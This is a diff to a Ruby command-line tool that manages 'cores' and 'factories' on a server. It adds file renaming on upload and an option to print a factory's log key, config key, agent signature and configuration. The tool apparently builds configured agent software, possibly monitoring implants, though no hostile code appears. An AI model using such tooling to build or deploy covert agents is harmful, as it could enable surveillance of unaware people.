@@ -8,6 +8,7 @@ require 'cgi'
 require 'optparse'
 require 'zip/zip'
 require 'zip/zipfilesystem'
+require 'securerandom'
 
 class CoreDeveloper
 
@@ -93,12 +94,13 @@ class CoreDeveloper
     puts "Replaced."
   end
 
-  def add(file)
+  def add(file, filename)
     raise "Must specify a core name" if @name.nil?
+    filename = file if filename.nil?
     content = File.open(file, 'rb') {|f| f.read}
     puts "Adding [#{file}] to the [#{@name}] core (#{content.bytesize} bytes)"
 
-    resp = @http.request_put("/core/#{@name}?name=#{file}", content, {'Cookie' => @cookie})
+    resp = @http.request_put("/core/#{@name}?name=#{filename}", content, {'Cookie' => @cookie})
     resp.kind_of? Net::HTTPSuccess or raise(resp.body)
   end
 
@@ -117,7 +119,7 @@ class CoreDeveloper
     resp.kind_of? Net::HTTPSuccess or raise(resp.body)
   end
 
-  def retrieve_factory(ident)
+  def retrieve_factory(ident, show)
     raise("you must specify a factory") if ident.nil?
 
     resp = @http.request_get('/factory', {'Cookie' => @cookie})
@@ -126,10 +128,35 @@ class CoreDeveloper
 
     factories.keep_if {|f| f['ident'] == ident}
 
+    raise('factory not found') if factories.empty?
+    
     @factory = factories.first
 
     puts "Using factory: #{@factory['ident']} #{@factory['name']}"
-    puts
+
+	  if show
+      resp = @http.request_get("/factory/#{@factory['_id']}", {'Cookie' => @cookie})
+      resp.kind_of? Net::HTTPSuccess or raise(resp.body)
+      factory = JSON.parse(resp.body)
+
+      logkey = Digest::MD5.digest(factory['logkey']) + SecureRandom.random_bytes(16)
+      confkey = Digest::MD5.digest(factory['confkey']) + SecureRandom.random_bytes(16)
+
+      puts "\t-> LOGKEY   : " + logkey.unpack('H*').first
+      puts "\t-> CONFKEY  : " + confkey.unpack('H*').first
+
+      resp = @http.request_get("/signature/agent", {'Cookie' => @cookie})
+      resp.kind_of? Net::HTTPSuccess or raise(resp.body)
+      signature = JSON.parse(resp.body)
+
+      sig = Digest::MD5.digest(signature['value']) + SecureRandom.random_bytes(16)
+
+      puts "\t-> SIGNATURE: " + sig.unpack('H*').first
+      puts
+
+      puts "CONFIG JSON:"
+      puts factory['configs'].first['config']
+    end
   end
 
   def config(param_file)
@@ -202,7 +229,7 @@ class CoreDeveloper
 
       c.delete if options[:delete]
       c.replace(options[:replace]) if options[:replace]
-      c.add(options[:add]) if options[:add]
+      c.add(options[:add],options[:addwithname]) if options[:add]
       c.remove(options[:remove]) if options[:remove]
       c.content if options[:content]
       c.get(options[:get]) if options[:get]
@@ -211,7 +238,7 @@ class CoreDeveloper
       c.list if options[:list]
 
       # building options
-      c.retrieve_factory(options[:factory]) if options[:factory]
+      c.retrieve_factory(options[:factory], options[:show_conf]) if options[:factory]
       c.output = options[:output]
       c.config(options[:config]) if options[:config]
       c.cert = c.upload(options[:cert]) if options[:cert]
@@ -260,6 +287,9 @@ optparse = OptionParser.new do |opts|
   opts.on( '-a', '--add FILE', 'add or replace FILE to the core on the db' ) do |file|
     options[:add] = file
   end
+  opts.on( '-A', '--addwithname FILE', 'specify the core\'s name on the db' ) do |file|
+    options[:addwithname] = file
+  end
   opts.on( '-r', '--remove FILE', 'remove FILE from the core on the db' ) do |file|
     options[:remove] = file
   end
@@ -274,6 +304,9 @@ optparse = OptionParser.new do |opts|
   opts.separator "Core building:"
   opts.on( '-f', '--factory IDENT', String, 'factory to be used' ) do |ident|
     options[:factory] = ident
+  end
+  opts.on( '-S', '--show-conf', 'show the config of the factory' ) do
+    options[:show_conf] = true
   end
   opts.on( '-b', '--build PARAMS_FILE', String, 'build the factory. PARAMS_FILE is a json file with the parameters' ) do |params|
     options[:build] = params
@@ -306,7 +339,6 @@ optparse = OptionParser.new do |opts|
     options[:db_port] = port
   end
 
-
   opts.separator ""
   opts.separator "General:"
   opts.on( '-h', '--help', 'Display this screen' ) do
@@ -319,3 +351,4 @@ optparse.parse(ARGV)
 
 # execute the configurator
 CoreDeveloper.run(options)
+
